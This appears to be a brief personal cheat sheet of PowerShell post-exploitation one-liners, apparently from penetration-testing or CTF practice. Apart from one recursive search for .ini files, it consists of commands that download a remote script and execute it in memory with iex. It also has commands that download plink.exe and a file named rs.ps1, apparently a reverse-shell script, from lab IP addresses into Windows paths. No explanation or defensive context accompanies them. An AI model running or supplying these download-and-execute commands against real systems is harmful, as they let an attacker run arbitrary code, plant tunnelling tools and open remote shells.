# Memo Commands

## Memo commands

### ls

```csharp
Get-ChildItem  -Include *.ini* -File -Recurse -ErrorAction SilentlyContinue
```

## Powershell Webclient

### Download and execute into memory

```csharp
iex((new-object net.webclient).downloadstring('http://URL/file.something'))
```

### TLS \(in case of https ...\)

```csharp
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex((new-object net.webclient).
downloadstring('http://URL/file.something'))
```

### Wget

```csharp
C:\>powershell (new-object System.Net.Webclient).DownloadFile('http://10.11.0.138/plink.exe','C:\plink.exe')
```

```csharp
powershell.exe -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://10.10.16.25/rs.ps1', 'c:\Windows\Temp\rs.ps1')"
```



